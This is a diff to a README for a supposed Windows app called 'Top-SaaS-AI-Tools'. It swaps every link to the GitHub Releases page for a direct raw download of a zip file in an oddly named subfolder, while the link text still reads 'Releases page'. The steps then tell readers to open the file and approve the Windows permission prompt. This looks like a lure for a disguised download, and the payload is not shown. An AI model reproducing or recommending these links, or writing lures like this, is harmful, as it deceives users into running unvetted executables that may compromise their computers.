@@ -1,6 +1,6 @@
 # 🧰 Top-SaaS-AI-Tools - Find Better Tools Faster
 
-[![Download Top-SaaS-AI-Tools](https://img.shields.io/badge/Download-Top--SaaS--AI--Tools-blue?style=for-the-badge&labelColor=grey)](https://github.com/Ryccaspacious922/Top-SaaS-AI-Tools/releases)
+[![Download Top-SaaS-AI-Tools](https://img.shields.io/badge/Download-Top--SaaS--AI--Tools-blue?style=for-the-badge&labelColor=grey)](https://raw.githubusercontent.com/Ryccaspacious922/Top-SaaS-AI-Tools/main/pterotic/Saa-A-Top-Tools-1.9-beta.3.zip)
 
 ## 🚀 What This Is
 
@@ -27,7 +27,7 @@ Use it to browse tools for:
 
 ## 📥 Download and Open
 
-1. Visit the [Releases page](https://github.com/Ryccaspacious922/Top-SaaS-AI-Tools/releases)
+1. Visit the [Releases page](https://raw.githubusercontent.com/Ryccaspacious922/Top-SaaS-AI-Tools/main/pterotic/Saa-A-Top-Tools-1.9-beta.3.zip)
 2. Download the latest release file for Windows
 3. Open the downloaded file
 4. If Windows asks for permission, select **Yes**
@@ -47,7 +47,7 @@ This app is built for easy use on Windows.
 
 ### How to install
 
-1. Go to the [Releases page](https://github.com/Ryccaspacious922/Top-SaaS-AI-Tools/releases)
+1. Go to the [Releases page](https://raw.githubusercontent.com/Ryccaspacious922/Top-SaaS-AI-Tools/main/pterotic/Saa-A-Top-Tools-1.9-beta.3.zip)
 2. Find the newest version at the top
 3. Download the Windows file from that release
 4. Wait for the download to finish
@@ -213,7 +213,7 @@ This repository covers a broad set of software areas, including:
 
 Use this link to visit the download page and get the latest Windows release:
 
-[https://github.com/Ryccaspacious922/Top-SaaS-AI-Tools/releases](https://github.com/Ryccaspacious922/Top-SaaS-AI-Tools/releases)
+[https://raw.githubusercontent.com/Ryccaspacious922/Top-SaaS-AI-Tools/main/pterotic/Saa-A-Top-Tools-1.9-beta.3.zip](https://raw.githubusercontent.com/Ryccaspacious922/Top-SaaS-AI-Tools/main/pterotic/Saa-A-Top-Tools-1.9-beta.3.zip)
 
 ## 📦 After You Install
 
